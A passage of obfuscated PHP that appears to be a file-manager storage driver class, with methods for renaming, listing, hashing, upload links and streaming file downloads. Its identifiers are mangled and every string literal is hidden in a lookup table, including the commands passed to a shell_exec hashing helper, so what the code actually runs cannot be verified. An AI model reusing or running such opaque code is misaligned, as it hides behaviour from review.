$this->objectDriver); } public function fileNameExist($çÁ½áÔ½, $²Ìû£Â¿) { $ôÌ°ÇÜ =& $_SERVER[µÅ˜º…æ]; $©¦¥¾°Á = rtrim($çÁ½áÔ½, $ôÌ°ÇÜ[8]) . $ôÌ°ÇÜ[8] . $²Ìû£Â¿; $—ŞÕ‚ù = $this->exist($©¦¥¾°Á); return $—ŞÕ‚ù ? $©¦¥¾°Á : !1; } public function setModifyTime($Å­’¿ˆ, $ôÉ™‡“™ = '') { } public function renameObject($àËø‹ ´, $’¦ŞµËØ) { $ÓÆ²¤ã = $’¦ŞµËØ; $àËø‹ ´ = $this->getPathOuter($àËø‹ ´); $’¦ŞµËØ = $this->pathFather($àËø‹ ´) . $’¦ŞµËØ; $¦ÆÁ–Áå = IO::copy($àËø‹ ´, $this->pathFather($àËø‹ ´), REPEAT_RENAME_FOLDER, $ÓÆ²¤ã); if ($¦ÆÁ–Áå) { IO::remove($àËø‹ ´); } return $¦ÆÁ–Áå ? $’¦ŞµËØ : !1; } public function tempFile($¤´ ıº€ = '', $Ô‹¤ô¾ = '') { if (!$¤´ ıº€) { $¤´ ıº€ = rand_string(15); } $­Ôú¸Â = TEMP_FILES . rand_string(15) . $_SERVER[µÅ˜º…æ][8]; @mkdir($­Ôú¸Â, DEFAULT_PERRMISSIONS, !0); $Üª‹Æ–Í = $­Ôú¸Â . $¤´ ıº€; @touch($Üª‹Æ–Í); if ($Ô‹¤ô¾) { file_put_contents($Üª‹Æ–Í, $Ô‹¤ô¾); } return $Üª‹Æ–Í; } public function tempFileRemve($íÌã‡çæ) { @unlink($íÌã‡çæ); @rmdir($this->pathFather($íÌã‡çæ)); } public function mkfile($Éï°Ùè, $øş ”ê¤ = '', $áÓÌñì = REPEAT_RENAME) { } public function mkdir($ÔÙñˆ‡Ö, $Ü«”±÷× = REPEAT_SKIP) { } public function delFile($ßª†äƒª) { } public function delFolder($¶Ë¶ÖÌ§) { } public function copyFile($ùÕ‹‹›Ä, $ŒÒĞİÒè) { } public function moveFile($ÙÆÈ€¿Á, $ˆ­®¼¨) { } public function remove($Ïëøíñã) { if ($this->isFile($Ïëøíñã)) { return $this->delFile($Ïëøíñã); } return $this->delFolder($Ïëøíñã); } public function rename($‰ñÅñÆı, $¦æğÀ¤œ) { } public function exist($íÛ¨›Û¦) { } public function isFile($ÏÒŒ—Šº) { } public function isFolder($˜ó®˜ÄÃ) { } public function size($À–ÊëÑÃ) { } public function info($ÖÔ¥ƒÂ¥) { } public function infoSimple($¤ÎŸ­ú‹) { return $this->info($¤ÎŸ­ú‹); } public function infoAuth($Â„‹‹Ì) { return $this->info($Â„‹‹Ì); } public function infoFull($Ùø»¨Û·) { return $this->info($Ùø»¨Û·); } public function infoFullSimple($„ÇöÊ‰¬) { return $this->info($„ÇöÊ‰¬); } public function infoWithChildren($¯òªœ­İ) { $€§ìüÂ =& $_SERVER[µÅ˜º…æ]; static $éÜ¥°© = array(); if (isset($éÜ¥°©[$¯òªœ­İ])) { return $éÜ¥°©[$¯òªœ­İ]; } $±Â™†ŒÖ = $this->info($¯òªœ­İ); if ($±Â™†ŒÖ && $±Â™†ŒÖ[$€§ìüÂ[33]] == $€§ìüÂ[78]) { $Úß²ªÉ = array($€§ìüÂ[79] => 0, $€§ìüÂ[80] => 0, $€§ìüÂ[81] => 0); $this->infoChildren($¯òªœ­İ, $Úß²ªÉ); $±Â™†ŒÖ[$€§ìüÂ[79]] = $Úß²ªÉ[$€§ìüÂ[79]]; $±Â™†ŒÖ[$€§ìüÂ[82]] = array($€§ìüÂ[83] => $Úß²ªÉ[$€§ìüÂ[80]], $€§ìüÂ[84] => $Úß²ªÉ[$€§ìüÂ[81]]); $éÜ¥°©[$¯òªœ­İ] = $±Â™†ŒÖ; } return $±Â™†ŒÖ; } public function listPath($¼Ã²–ë, $í‹÷œ½¼ = false) { } public function has($ù«Òï˜è, $á«¨ëû = false, $½Á¶Ÿ³ = false) { } public function canRead($ÓÛšì¶) { } public function canWrite($ ñˆ ÙÀ) { } public function getContent($Äé³ı‚) { } public function setContent($š”ÒÖ›š, $Û¶åûã» = '') { } protected function infoChildren($Íš·“öû, &$ıÂÀ‹Ä») { $ÂõÑ³À =& $_SERVER[µÅ˜º…æ]; check_abort_echo(); $°÷Š¾ğş = $this->listPath($Íš·“öû, !0); $°÷Š¾ğş = array_merge($°÷Š¾ğş[$ÂõÑ³À[85]], $°÷Š¾ğş[$ÂõÑ³À[86]]); foreach ($°÷Š¾ğş as $Œ·Ò©¤™) { if ($Œ·Ò©¤™[$ÂõÑ³À[33]] == $ÂõÑ³À[78]) { $ıÂÀ‹Ä»[$ÂõÑ³À[81]]++; $Û‡¹¥ìæ = $this->getPathInner($Œ·Ò©¤™[$ÂõÑ³À[87]]); $this->infoChildren($Û‡¹¥ìæ, $ıÂÀ‹Ä»); } else { $ıÂÀ‹Ä»[$ÂõÑ³À[80]]++; $ıÂÀ‹Ä»[$ÂõÑ³À[79]] += $Œ·Ò©¤™[$ÂõÑ³À[79]]; } } } public function fileSubstr($”ÉÛÏ£, $äõ‡‰À¾, $ÁğôÒ•Œ) { } public function listAll($èöîÍÉõ) { } public function listAllMake($Ò‘ÏÙÀî, &$³“ñø) { $¨ç©»‡ =& $_SERVER[µÅ˜º…æ]; check_abort_echo(); $Ì»êØÌÔ = $this->listPath($Ò‘ÏÙÀî, !0); if (!$Ì»êØÌÔ) { return; } $ßÚäùø = array_merge($Ì»êØÌÔ[$¨ç©»‡[85]], $Ì»êØÌÔ[$¨ç©»‡[86]]); foreach ($ßÚäùø as $¾”Œ‹¹) { $òë¿³Ú« = $¾”Œ‹¹[$¨ç©»‡[33]] == $¨ç©»‡[78]; $ºÃòÅ = array($¨ç©»‡[87] => $¾”Œ‹¹[$¨ç©»‡[87]], $¨ç©»‡[78] => $òë¿³Ú«); if (isset($¾”Œ‹¹[$¨ç©»‡[79]])) { $ºÃòÅ[$¨ç©»‡[79]] = $¾”Œ‹¹[$¨ç©»‡[79]]; } if (isset($¾”Œ‹¹[$¨ç©»‡[88]])) { $ºÃòÅ[$¨ç©»‡[88]] = $¾”Œ‹¹[$¨ç©»‡[88]]; } if (!$òë¿³Ú«) { $³“ñø[] = $ºÃòÅ; continue; } $³“ñø[] = $ºÃòÅ; $Ø²÷ø‰Û = $¾”Œ‹¹[$¨ç©»‡[87]]; $ğš·ó² = $this->pathDriver; if (substr($¾”Œ‹¹[$¨ç©»‡[87]], 0, strlen($ğš·ó²)) == $ğš·ó²) { $Ø²÷ø‰Û = substr($Ø²÷ø‰Û, strlen($ğš·ó²)); } $this->listAllMake($Ø²÷ø‰Û, $³“ñø); } } public function listAllSimple($Ôƒ‹ä²Ü, $ÆÃšú§Í = false) { $¢êÕÄ¨ = $this->listAll($Ôƒ‹ä²Ü); return $this->listAllSimpleMake($¢êÕÄ¨, $this->getPathOuter($Ôƒ‹ä²Ü), $ÆÃšú§Í); } public function listAllSimpleMake($îÏ¼ú¦, $ï×ê–ú©, $öõÔ­ÚÊ) { $§…Ç›Ó¾ =& $_SERVER[µÅ˜º…æ]; $Šá¿¬Îİ = array(); $ï×ê–ú© = rtrim(get_path_father($ï×ê–ú©), $§…Ç›Ó¾[8]) . $§…Ç›Ó¾[8]; foreach ($îÏ¼ú¦ as $³òÁ¬‚) { $–³áøÓÜ = array($§…Ç›Ó¾[87] => $³òÁ¬‚[$§…Ç›Ó¾[87]], $§…Ç›Ó¾[89] => $³òÁ¬‚[$§…Ç›Ó¾[87]], $§…Ç›Ó¾[78] => $³òÁ¬‚[$§…Ç›Ó¾[78]]); if (isset($³òÁ¬‚[$§…Ç›Ó¾[79]]) && !$³òÁ¬‚[$§…Ç›Ó¾[78]]) { $–³áøÓÜ[$§…Ç›Ó¾[79]] = $³òÁ¬‚[$§…Ç›Ó¾[79]]; } if (isset($³òÁ¬‚[$§…Ç›Ó¾[88]])) { $–³áøÓÜ[$§…Ç›Ó¾[88]] = $³òÁ¬‚[$§…Ç›Ó¾[88]]; } if (is_array($³òÁ¬‚[$§…Ç›Ó¾[90]])) { $–³áøÓÜ[$§…Ç›Ó¾[89]] = $³òÁ¬‚[$§…Ç›Ó¾[90]][$§…Ç›Ó¾[87]]; $–³áøÓÜ[$§…Ç›Ó¾[79]] = $³òÁ¬‚[$§…Ç›Ó¾[90]][$§…Ç›Ó¾[79]]; $–³áøÓÜ[$§…Ç›Ó¾[88]] = $³òÁ¬‚[$§…Ç›Ó¾[90]][$§…Ç›Ó¾[88]]; } else { if (substr($³òÁ¬‚[$§…Ç›Ó¾[87]], 0, strlen($ï×ê–ú©)) == $ï×ê–ú©) { $–³áøÓÜ[$§…Ç›Ó¾[87]] = substr($³òÁ¬‚[$§…Ç›Ó¾[87]], strlen($ï×ê–ú©)); } } $ŸéªãÆ = $³òÁ¬‚[$§…Ç›Ó¾[78]] ? $§…Ç›Ó¾[8] : $§…Ç›Ó¾[12]; $–³áøÓÜ[$§…Ç›Ó¾[89]] = rtrim($–³áøÓÜ[$§…Ç›Ó¾[89]], $§…Ç›Ó¾[8]) . $ŸéªãÆ; $–³áøÓÜ[$§…Ç›Ó¾[87]] = $§…Ç›Ó¾[8] . trim($–³áøÓÜ[$§…Ç›Ó¾[87]], $§…Ç›Ó¾[8]) . $ŸéªãÆ; if (!$öõÔ­ÚÊ) { $õåªìÊ‚ = explode($§…Ç›Ó¾[8], trim($–³áøÓÜ[$§…Ç›Ó¾[87]], $§…Ç›Ó¾[8])); $–³áøÓÜ[$§…Ç›Ó¾[87]] = $§…Ç›Ó¾[8] . implode($§…Ç›Ó¾[8], array_slice($õåªìÊ‚, 1)) . $ŸéªãÆ; } $Šá¿¬Îİ[] = $–³áøÓÜ; } return array_sort_by($Šá¿¬Îİ, $§…Ç›Ó¾[87]); } public function upload($¹Ø‹ß‰Œ, $ÍÜ¥®Ñ, $óÚá…ù = false, $»ã‚°ùİ = REPEAT_REPLACE) { } public function uploadFileByID($¼¿£øğá, $ì•—íæ, $İõš¨ÑÃ) { } public function uploadFileByPath($ŠşúÏß›, $£˜–û‹, $×ˆ¸äëœ = array()) { } public function isUploadServer() { $¢ùû¶±µ =& $_SERVER[µÅ˜º…æ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¢ùû¶±µ[91]) { return !0; } return $GLOBALS[$¢ùû¶±µ[6]][$¢ùû¶±µ[92]][$¢ùû¶±µ[93]]; } public function isFileOutServer() { $êğŞù€Ó =& $_SERVER[µÅ˜º…æ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $êğŞù€Ó[91]) { return !0; } return $GLOBALS[$êğŞù€Ó[6]][$êğŞù€Ó[92]][$êğŞù€Ó[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($˜ÆØºğø) { $ş­¸§·İ =& $_SERVER[µÅ˜º…æ]; if (!$this->isCdnHost()) { return $˜ÆØºğø; } return str_replace(trim(get_url_root($˜ÆØºğø), $ş­¸§·İ[8]), trim($this->cdnHost, $ş­¸§·İ[8]), $˜ÆØºğø); } public function uploadLink($¨™½‰»¬, $áí¥Ê = 0) { $ùŒ½›çÀ =& $_SERVER[µÅ˜º…æ]; if ($this->isUploadServer()) { return; } $£—‹±ÏÓ = $this->getType(); if (!in_array($£—‹±ÏÓ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $©ğ¯½ƒ = 1024 * 1024 * 10; $ºñÚ–€Š = (!$áí¥Ê ? 1 : ceil($áí¥Ê / pow(1024, 3))) * 3600 * 4; if ($áí¥Ê <= $©ğ¯½ƒ) { $üì„½â = $this->uploadFormData($¨™½‰»¬, $ºñÚ–€Š); } else { $üì„½â = $this->uploadMultiData($¨™½‰»¬, $ºñÚ–€Š); } if ($üì„½â) { $üì„½â[$ùŒ½›çÀ[95]] = $¨™½‰»¬; $üì„½â[$ùŒ½›çÀ[96]] = $£—‹±ÏÓ; } return $üì„½â; } public function uploadFormData($Î»ŒÜÕ», $­ÎÈ¨Ş = 3600) { } public function uploadMultiData($æÚÒ¦ß¤, $·’³§Õ« = 3600) { } public function multiUploadFormData($Í—ù¥êË, $ìãå÷ºã = 3600) { return $this->uploadMultiData($Í—ù¥êË, $ìãå÷ºã); } public function download($©Â“·€, $ƒÑÉ¡é˜) { } public function ext($è¶ùå¾) { return get_path_ext($è¶ùå¾); } public function pathThis($Â÷àÃÂ) { $ığ¤Åù£ =& $_SERVER[µÅ˜º…æ]; $Â÷àÃÂ = str_replace($ığ¤Åù£[97], $ığ¤Åù£[8], rtrim($Â÷àÃÂ, $ığ¤Åù£[8])); $³Å©§¥õ = strrpos($Â÷àÃÂ, $ığ¤Åù£[8]); if ($³Å©§¥õ === !1) { return $Â÷àÃÂ; } return substr($Â÷àÃÂ, $³Å©§¥õ + 1); } public function pathFather($êÔĞ÷É®) { $«ŠØí¥ =& $_SERVER[µÅ˜º…æ]; $êÔĞ÷É® = str_replace($«ŠØí¥[97], $«ŠØí¥[8], rtrim($êÔĞ÷É®, $«ŠØí¥[8])); $ã¬šåæ® = strrpos($êÔĞ÷É®, $«ŠØí¥[8]); if ($ã¬šåæ® === !1) { return $«ŠØí¥[12]; } return substr($êÔĞ÷É®, 0, $ã¬šåæ® + 1); } public function hashSimple($Ü–íèò) { $§›×»¿ =& $_SERVER[µÅ˜º…æ]; if (!$Ü–íèò) { return md5($§›×»¿[12]); } $¹ƒ¸ = $this->size($Ü–íèò); $İã°ó–© = 200; $Ë¤Öïˆê = 50; if ($¹ƒ¸ <= $İã°ó–© * $Ë¤Öïˆê) { return $this->hashMd5($Ü–íèò) . $¹ƒ¸; } $ôéÄ¨¶° = intval($¹ƒ¸ / $Ë¤Öïˆê); $Œ›¥ïñÁ = $§›×»¿[12]; for ($äĞĞª‰ = 0; $äĞĞª‰ < $Ë¤Öïˆê; $äĞĞª‰++) { $Œ›¥ïñÁ .= $this->fileSubstr($Ü–íèò, $ôéÄ¨¶° * $äĞĞª‰, $İã°ó–©); } $Œ›¥ïñÁ .= $this->fileSubstr($Ü–íèò, $¹ƒ¸ - $İã°ó–©, $İã°ó–©); return md5($Œ›¥ïñÁ) . $¹ƒ¸; } public static $md5Cache = array(); public function hashMd5($ÓÜ”ê‘) { if (!$ÓÜ”ê‘) { return md5($_SERVER[µÅ˜º…æ][12]); } $ÓÜ”ê‘ = $this->iconvSystem($ÓÜ”ê‘); if (isset(self::$md5Cache[$ÓÜ”ê‘])) { return self::$md5Cache[$ÓÜ”ê‘]; } self::$md5Cache[$ÓÜ”ê‘] = $this->hashMd5Shell($ÓÜ”ê‘); if (!self::$md5Cache[$ÓÜ”ê‘]) { self::$md5Cache[$ÓÜ”ê‘] = @md5_file($ÓÜ”ê‘); } return self::$md5Cache[$ÓÜ”ê‘]; } private function hashMd5Shell($®µöŠ«Ö) { $·Üö±’á =& $_SERVER[µÅ˜º…æ]; if (!$®µöŠ«Ö) { return md5($·Üö±’á[12]); } if (!function_exists($·Üö±’á[98])) { return !1; } $ºÖûÑê = array($·Üö±’á[99], $·Üö±’á[100]); $“¿›Ìâ = Cache::get($·Üö±’á[101]); if (!$“¿›Ìâ) { $Å›ªÎ = BASIC_PATH . $·Üö±’á[102]; $íÁÎ†×ô = md5_file($Å›ªÎ); $“¿›Ìâ = $·Üö±’á[103]; foreach ($ºÖûÑê as $Û¬Î•ç) { $³êİ¶Ô = shell_exec($Û¬Î•ç . $·Üö±’á[53] . escapeShell($Å›ªÎ)); if ($³êİ¶Ô && substr(trim($³êİ¶Ô), 0, 32) == $íÁÎ†×ô) { $“¿›Ìâ = $Û¬Î•ç; break; } } Cache::set($·Üö±’á[101], $“¿›Ìâ, 3600); } if ($“¿›Ìâ == $·Üö±’á[103]) { return !1; } $³êİ¶Ô = shell_exec($“¿›Ìâ . $·Üö±’á[53] . escapeShell($®µöŠ«Ö)); $³êİ¶Ô = str_replace($·Üö±’á[104], $·Üö±’á[12], $³êİ¶Ô); return substr($³êİ¶Ô, 0, 32); } public function link($†Ù†àÇ£) { return $†Ù†àÇ£; } public function fileOut($­¹ÂÄè‡, $Â¾·’…ß = false, $Şê±ûŞ = false, $¥®ÀëùÆ = '') { $ÈÈ¾ä­² =& $_SERVER[µÅ˜º…æ]; $this->cacheMethod(null, null); if (!$­¹ÂÄè‡ || !$this->exist($­¹ÂÄè‡)) { show_json(LNG($ÈÈ¾ä­²[105]), !1, $Şê±ûŞ); } $±ÖÀ ¡Ñ = $this->getType() == $ÈÈ¾ä­²[106]; $š¢ªİ® = $GLOBALS[$ÈÈ¾ä­²[6]][$ÈÈ¾ä­²[92]][$ÈÈ¾ä­²[107]][$ÈÈ¾ä­²[108]]; $¾şÍˆ“ = (double) $GLOBALS[$ÈÈ¾ä­²[6]][$ÈÈ¾ä­²[92]][$ÈÈ¾ä­²[107]][$ÈÈ¾ä­²[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ğ§Ğø¤œ = $this->infoFull($­¹ÂÄè‡); $„æî˜â£ = $ğ§Ğø¤œ[$ÈÈ¾ä­²[79]]; $àí¾òÑ¨ = gmdate($ÈÈ¾ä­²[110], $ğ§Ğø¤œ[$ÈÈ¾ä­²[88]]); $’¾÷€£ = $Şê±ûŞ ? $Şê±ûŞ : $this->iconvApp($ğ§Ğø¤œ[$ÈÈ¾ä­²[32]]); $¥ÚÕÜ = 0; $©†ÌÊÓ = $„æî˜â£ - 1; $÷Ø©Ñä‚ = $this->ext($’¾÷€£); if (in_array($÷Ø©Ñä‚, array($ÈÈ¾ä­²[111], $ÈÈ¾ä­²[112], $ÈÈ¾ä­²[113], $ÈÈ¾ä­²[114]))) { $÷Ø©Ñä‚ = $ÈÈ¾ä­²[115]; } if (in_array($÷Ø©Ñä‚, array($ÈÈ¾ä­²[116]))) { $÷Ø©Ñä‚ = $ÈÈ¾ä­²[117]; } if (!$¥®ÀëùÆ) { $¥®ÀëùÆ = md5($àí¾òÑ¨ . $„æî˜â£); } $¥®ÀëùÆ = $ÈÈ¾ä­²[118] . $¥®ÀëùÆ . $ÈÈ¾ä­²[118]; $‚ÎÌşç§ = get_file_mime($÷Ø©Ñä‚); $¤ş§Áı = !0; $¤ş§Áı = isset($_GET[$ÈÈ¾ä­²[119]]) ? !1 : !0; if ($Â¾·’…ß === !1 && !mime_support($‚ÎÌşç§)) { $‚ÎÌşç§ = $ÈÈ¾ä­²[120]; } header($ÈÈ¾ä­²[121]); header($ÈÈ¾ä­²[122] . $‚ÎÌşç§); $óî’˜šÅ = rawurlencode($’¾÷€£); $óî’˜šÅ = $ÈÈ¾ä­²[118] . $óî’˜šÅ . $ÈÈ¾ä­²[123] . $óî’˜šÅ; if ($Â¾·’…ß) { header($ÈÈ¾ä­²[124]); header($ÈÈ¾ä­²[125] . $óî’˜šÅ); } else { if ($¤ş§Áı) { header($ÈÈ¾ä­²[126] . $óî’˜šÅ); } } $ˆ°¡ÎŒı = 3600 * 24 * 30; header($ÈÈ¾ä­²[127]); header($ÈÈ¾ä­²[128]); header($ÈÈ¾ä­²[129] . $ˆ°¡ÎŒı); header($ÈÈ¾ä­²[130] . gmdate($ÈÈ¾ä­²[110], time() + $ˆ°¡ÎŒı) . $ÈÈ¾ä­²[131]); if (isset($_SERVER[$ÈÈ¾ä­²[132]]) && strtotime($_SERVER[$ÈÈ¾ä­²[132]]) == $ğ§Ğø¤œ[$ÈÈ¾ä­²[88]]) { header($ÈÈ¾ä­²[133], !0, 304); die; } if (isset($_SERVER[$ÈÈ¾ä­²[134]]) && $_SERVER[$ÈÈ¾ä­²[134]] == $¥®ÀëùÆ) { header($ÈÈ¾ä­²[135] . $¥®ÀëùÆ, !0, 304); die; } header($ÈÈ¾ä­²[135] . $¥®ÀëùÆ); header($ÈÈ¾ä­²[136] . $àí¾òÑ¨ . $ÈÈ¾ä­²[131]); header($ÈÈ¾ä­²[137] . rawurlencode($’¾÷€£)); header($ÈÈ¾ä­²[138]); header($ÈÈ¾ä­²[139] . $„æî˜â£); header($ÈÈ¾ä­²[140]); Hook::trigger($ÈÈ¾ä­²[141], $­¹ÂÄè‡, $„æî˜â£, $’¾÷€£, $÷Ø©Ñä‚); if (!$Â¾·’…ß && $÷Ø©Ñä‚ == $ÈÈ¾ä­²[142]) { if ($„æî˜â£ > 1024 * 1024 * 10) { die; } $í‰¨û¢” = $this->getContent($­¹ÂÄè‡); $í‰¨û¢” = Html::clearSVG($í‰¨û¢”); header($ÈÈ¾ä­²[143] . strlen($í‰¨û¢”)); echo $í‰¨û¢”; die; } $ü«´Ñ¡‰ = strtolower($_SERVER[$ÈÈ¾ä­²[144]]); if ($±ÖÀ ¡Ñ && $ü«´Ñ¡‰ && $š¢ªİ®) { if (strstr($ü«´Ñ¡‰, $ÈÈ¾ä­²[145])) { header($ÈÈ¾ä­²[146] . $­¹ÂÄè‡); } else { if (strstr($ü«´Ñ¡‰, $ÈÈ¾ä­²[147])) { header($ÈÈ¾ä­²[148] . $­¹ÂÄè‡); } else { if (strstr($ü«´Ñ¡‰, $ÈÈ¾ä­²[149])) { header($ÈÈ¾ä­²[150] . $­¹ÂÄè‡); } } } if ($¾şÍˆ“) { header($ÈÈ¾ä­²[151] . $¾şÍˆ“); } return; } if (isset($_SERVER[$ÈÈ¾ä­²[152]])) { if (preg_match($ÈÈ¾ä­²[153], $_SERVER[$ÈÈ¾ä­²[152]], $â¡ó¯ÎÈ)) { $¥ÚÕÜ = intval($â¡ó¯ÎÈ[1]); $¥ÚÕÜ = $¥ÚÕÜ <= 0 ? 0 : ($¥ÚÕÜ >= $©†ÌÊÓ ? $©†ÌÊÓ : $¥ÚÕÜ); if (!empty($â¡ó¯ÎÈ[2])) { $¼Â»ØÍÕ = intval($â¡ó¯ÎÈ[2]); $©†ÌÊÓ = $¼Â»ØÍÕ < $¥ÚÕÜ ? $¥ÚÕÜ : ($¼Â»ØÍÕ >= $©†ÌÊÓ ? $©†ÌÊÓ : $¼Â»ØÍÕ); } } header($ÈÈ¾ä­²[154]); header("\103\x6f\156\164\145\156\164\55\x52\141\156\147\145\72\x20\x62\x79\x74\145\163\x20{$¥ÚÕÜ}\55{$©†ÌÊÓ}\x2f" . $„æî˜â£); } else { header($ÈÈ¾ä­²[155]); } header($ÈÈ¾ä­²[156]); header($ÈÈ¾ä­²[157]); $î·şº¢é = !0; if ($_SERVER[$ÈÈ¾ä­²[158]] == $ÈÈ¾ä­²[159] && $„æî˜â£ > 1204 * 1024 * 1024 * 2) { $î·şº¢é = !1; } if ($î·şº¢é) { header($ÈÈ¾ä­²[160] . ($©†ÌÊÓ - $¥ÚÕÜ + 1)); } if ($_SERVER[$ÈÈ¾ä­²[161]] == $ÈÈ¾ä­²[162]) { return; } $Úªïä°Ğ = array($ÈÈ¾ä­²[163] => !1, $ÈÈ¾ä­²[164] => $¥ÚÕÜ, $ÈÈ¾ä­²[165] => $©†ÌÊÓ, $ÈÈ¾ä­²[166] => $÷Ø©Ñä‚, $ÈÈ¾ä­²[167] => $ğ§Ğø¤œ, $ÈÈ¾ä­²[168] => $ÈÈ¾ä­²[12], $ÈÈ¾ä­²[169] => 0); $Úªïä°Ğ = Hook::filter($ÈÈ¾ä­²[170], $Úªïä°Ğ); $“çÇØöğ = 1024 * 300; $ôÉíîáá = 0; if ($¾şÍˆ“) { $ôÉíîáá = intval(1000 * 1000 * ($“çÇØöğ / $¾şÍˆ“)); } while ($¥ÚÕÜ <= $©†ÌÊÓ) { $¦ì˜óä = timeFloat(); check_abort(); $ÍÀ®ÏÆÔ = $©†ÌÊÓ - $¥ÚÕÜ + 1; if ($ÍÀ®ÏÆÔ <= $“çÇØöğ) { $“çÇØöğ = $ÍÀ®ÏÆÔ; } $í‰¨û¢” = $this->fileSubstr($­¹ÂÄè‡, $¥ÚÕÜ, $“çÇØöğ); if ($Úªïä°Ğ[$ÈÈ¾ä­²[163]]) { $Úªïä°Ğ[$ÈÈ¾ä­²[168]] = $í‰¨û¢”; $Úªïä°Ğ[$ÈÈ¾ä­²[169]] = $¥ÚÕÜ; $Úªïä°Ğ = Hook::filter($ÈÈ¾ä­²[171], $Úªïä°Ğ); $í‰¨û¢” = $Úªïä°Ğ[$ÈÈ¾ä­²[168]]; } echo $í‰¨û¢”; $¥ÚÕÜ += $“çÇØöğ; if ($“çÇØöğ == $ÍÀ®ÏÆÔ) { $¥ÚÕÜ = $©†ÌÊÓ + 1; } if ($ôÉíîáá) { $øğ×İëÒ = intval(1000 * 1000 * (timeFloat() - $¦ì˜óä)); $üÅñ»‹² = $ôÉíîáá - $øğ×İëÒ; if ($üÅñ»‹² > 5) { usleep($üÅñ»‹²); } } } } public function fileOutServer($äÒ»ËÚ‰, $ìØ’æÑ· = false, $„şÌ»‹Ò = false, $ŸÒûô•¾ = '') { $this->fileOut($äÒ»ËÚ‰, $ìØ’æÑ·, $„şÌ»‹Ò, $ŸÒûô•¾); } public function fileOutLink($òœÍ£‘Ø) { header($_SERVER[µÅ˜º…æ][172] . $òœÍ£‘Ø); die; } public function cacheMethod($®¡õŠñ‘, $ïÕµÏ‡İ, $áëÂÛ€ = null) { $¦±û‚èÎ =& $_SERVER[µÅ˜º…æ]; static $–İÁ¢ıÕ = array(); $óşÉÙ£Ö = $ïÕµÏ‡İ ? ltrim($this->getPathOuter($ïÕµÏ‡İ), $¦±û‚èÎ[8]) : $¦±û‚èÎ[12]; $ƒıÑ³å¥ = $¦±û‚èÎ[173] . $®¡õŠñ‘ . $¦±û‚èÎ[174] . rtrim($óşÉÙ£Ö, $¦±û‚èÎ[8]); if (is_null($®¡õŠñ‘)) { $–İÁ¢ıÕ = array(); return; } if (is_null($ïÕµÏ‡İ)) { foreach ($–İÁ¢ıÕ as $ƒıÑ³å¥ => $½ıŒçÚÉ) { if (!strstr($ƒıÑ³å¥, $¦±û‚èÎ[173] . $®¡õŠñ‘ . $¦±û‚èÎ[175])) { continue; } unset($–İÁ¢ıÕ[$ƒıÑ³å¥]); } return; } if ($áëÂÛ€ === $¦±û‚èÎ[176]) { unset($–İÁ¢ıÕ[$ƒıÑ³å¥]); return; } if (!is_null($áëÂÛ€)) { $–İÁ¢ıÕ[$ƒıÑ³å¥] = $áëÂÛ€; return; } $‘·±Å¤¼ = isset($–İÁ¢ıÕ[$ƒıÑ³å¥]) ? $–İÁ¢ıÕ[$ƒıÑ³å¥] : null; if (!is_null($‘·±Å¤¼)) { return $‘·±Å¤¼; } $‘·±Å¤¼ = $this->{$®¡õŠñ‘}($ïÕµÏ‡İ); $–İÁ¢ıÕ[$ƒıÑ³å¥] = $‘·±Å¤¼; return $‘·±Å¤¼; } public function cacheMethodInfoSet($µ¥ó°Õ¡, $ƒŞ¬› ¤, $…ÖÏ±òÑ = false) { $òÛÅŒ†ø =& $_SERVER[µÅ˜º…æ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($òÛÅŒ†ø[177], $µ¥ó°Õ¡, $ƒŞ¬› ¤); $this->cacheMethod($òÛÅŒ†ø[178], $µ¥ó°Õ¡, $ƒŞ¬› ¤ ? !1 : !0); if (is_array($…ÖÏ±òÑ)) { $this->cacheMethod($òÛÅŒ†ø[179], $µ¥ó°Õ¡, $…ÖÏ±òÑ); } } public function fileOutImage($ê©İ©Š, $¸Şì¤à¿ = 250) { $èÁñŒá =& $_SERVER[µÅ˜º…æ]; set_timeout(); if (substr($ê©İ©Š, 0, 4) == $èÁñŒá[149]) { $this->fileOutLink($ê©İ©Š); } $¾€ù·Ü£ = $this->info($ê©İ©Š); $¯Âú±ÌÃ = !1; $©õĞ­Ìß = isset($GLOBALS[$èÁñŒá[180]]) ? $GLOBALS[$èÁñŒá[180]] : array(); if ($©õĞ­Ìß && $©õĞ­Ìß[$èÁñŒá[181]] == $¾€ù·Ü£[$èÁñŒá[87]]) { $¾€ù·Ü£ = $©õĞ­Ìß; $îóœô¸ç = $¾€ù·Ü£[$èÁñŒá[182]]; if ($îóœô¸ç && isset($îóœô¸ç[$èÁñŒá[183]])) { if ($îóœô¸ç[$èÁñŒá[183]] <= $¸Şì¤à¿ && $îóœô¸ç[$èÁñŒá[184]] <= $¸Şì¤à¿) { $¯Âú±ÌÃ = !0; } } } if ($¾€ù·Ü£[$èÁñŒá[79]] <= 1024 * 50 || $¯Âú±ÌÃ || !function_exists($èÁñŒá[185]) || $¾€ù·Ü£[$èÁñŒá[166]] == $èÁñŒá[186]) { return $this->fileOut($ê©İ©Š, !1, $¾€ù·Ü£[$èÁñŒá[32]]); } $ñ½êìÃ– = kodIO::hashPath($¾€ù·Ü£); $†™¢®ä¨ = "\143\157\166\145\162\x5f{$ñ½êìÃ–}\137{$¸Şì¤à¿}\x2e\160\156\147"; $–Ùù±ˆİ = IO_PATH_SYSTEM_TEMP . $èÁñŒá[187]; $‹Âª¹ò¦ = IO::infoFullSimple($–Ùù±ˆİ); $ö¨‚ûôŠ = $‹Âª¹ò¦ && is_array($‹Âª¹ò¦) ? $‹Âª¹ò¦[$èÁñŒá[87]] : $èÁñŒá[12]; if (!$ö¨‚ûôŠ) { $ö¨‚ûôŠ = IO::mkdir($–Ùù±ˆİ); } if ($¾€ù·Ü£[$èÁñŒá[188]] == $èÁñŒá[189] && isset($¾€ù·Ü£[$èÁñŒá[190]]) && $¾€ù·Ü£[$èÁñŒá[190]] == kodIO::sourceID($ö¨‚ûôŠ)) { $œ›ÙïÜ² = $¾€ù·Ü£[$èÁñŒá[191]]; if ($¸Şì¤à¿ <= 500) { $àÏÁÀÁĞ = preg_replace($èÁñŒá[192], $èÁñŒá[193], $¾€ù·Ü£[$èÁñŒá[32]]); $œ›ÙïÜ² = IO::fileNameExist($ö¨‚ûôŠ, 